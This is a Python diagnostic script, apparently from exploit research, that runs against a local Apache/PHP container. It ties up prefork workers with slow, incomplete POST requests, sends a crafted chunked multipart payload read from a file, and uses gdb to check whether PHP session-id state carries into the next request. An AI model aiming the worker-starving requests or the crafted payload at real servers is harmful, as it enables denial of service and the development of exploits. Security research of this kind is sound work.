#!/usr/bin/env python3
"""Diagnostic: does PS(id) survive from an aborted A1 startup into the next
request on the same child?  Occupies all but one prefork child, sends A1,
dumps, sends GET, dumps again."""
import socket
import subprocess
import sys
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18701
CONT = sys.argv[2] if len(sys.argv) > 2 else "m109-8426"
GDB = sys.argv[3] if len(sys.argv) > 3 else "scripts/dump_state.gdb"
A1 = sys.argv[4] if len(sys.argv) > 4 else "/tmp/a1_8426.bin"

HOLD = int(sys.argv[5]) if len(sys.argv) > 5 else 4


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout


def last_line():
    return sh(f"docker exec {CONT} sh -c 'tail -1 /var/log/apache2/p2s-access.log'").strip()


def dump(pid):
    sh(f"docker exec -i -u root {CONT} sh -c 'cat > /tmp/dump_state.gdb' < {GDB}")
    out = sh(f"docker exec {CONT} gdb -q -p {pid} -batch -x /tmp/dump_state.gdb 2>&1")
    for ln in out.splitlines():
        if ln.startswith(("STATE", "IDLEN", "IDMEM")):
            print("   " + ln)
    return out


def send_chunked(port, path, body_file, timeout=180):
    with open(body_file, "rb") as fh:
        body = fh.read()
    hdr = ("POST %s HTTP/1.1\r\nHost: x:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n" %
           (path, port, "C" * 10)).encode()
    out = bytearray(hdr)
    for i in range(0, len(body), 65536):
        piece = body[i:i + 65536]
        out += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
    out += b"0\r\n\r\n"
    resp = bytearray()
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(out)
        while len(resp) < 1 << 20:
            c = s.recv(65536)
            if not c:
                break
            resp.extend(c)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def main():
    holders = []
    for i in range(HOLD):
        s = socket.create_connection(("127.0.0.1", PORT), timeout=10)
        s.sendall(b"POST /index.php HTTP/1.0\r\nHost: x\r\nContent-Length: 1000000\r\n\r\nX")
        holders.append(s)
    for _ in range(40):
        time.sleep(0.5)
        n = int(sh(f"docker exec {CONT} sh -c 'pgrep -c apache2'").strip() or 0)
        if n >= HOLD + 1:
            break
    print("holders up:", HOLD, "children:", n)

    print("=== A1")
    resp = send_chunked(PORT, "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v", A1)
    print("A1 status:", resp.split(b"\r\n")[0])
    time.sleep(0.3)
    line = last_line()
    pid1 = line.split()[0] if line else "0"
    print("A1 log:", line)
    dump(pid1)

    print("=== GET after A1 (same child if holders worked)")
    s = socket.create_connection(("127.0.0.1", PORT), timeout=10)
    s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
    data = s.recv(4096)
    s.close()
    print("GET status:", data.split(b"\r\n")[0])
    time.sleep(0.3)
    line = last_line()
    pid2 = line.split()[0] if line else "0"
    print("GET log:", line, "same_child=", pid1 == pid2)
    dump(pid2)

    for s in holders:
        try:
            s.close()
        except OSError:
            pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
